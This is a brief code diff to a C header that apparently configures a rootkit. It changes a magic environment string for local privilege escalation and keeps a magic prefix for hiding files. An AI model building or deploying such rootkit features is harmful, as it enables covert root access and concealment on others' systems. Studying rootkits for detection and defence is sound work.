@@ -10,7 +10,7 @@
 #define EPOCH_TIME 0000000000
 
 /* magic environment variable for Local Privilege Escalation (LPE) */
-#define ENV "3sc4l4t3"
+#define ENV "esc4l4t3"
 
 /* magic prefix for hidden files */
 #define STRING "h1d3_"
